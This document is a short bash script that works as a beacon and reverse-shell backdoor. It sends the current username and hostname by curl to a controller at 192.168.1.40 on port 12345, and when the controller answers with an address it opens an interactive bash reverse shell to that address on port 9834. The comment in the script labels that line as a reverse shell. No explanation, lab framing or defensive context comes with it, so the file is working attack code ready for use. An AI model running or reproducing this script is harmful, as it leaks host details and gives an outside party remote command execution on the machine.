ip_server="192.168.1.40"
user=`whoami`
hostname=`hostname`
response=`curl -s ${ip_server}:12345/update -d "username=${user}&host=${hostname}"`
if [ ! "$response" = "0" ]; then
    echo "Connecting to $response"
    bash -i >& /dev/tcp/${response}/9834 0>&1 #reverse shell
fi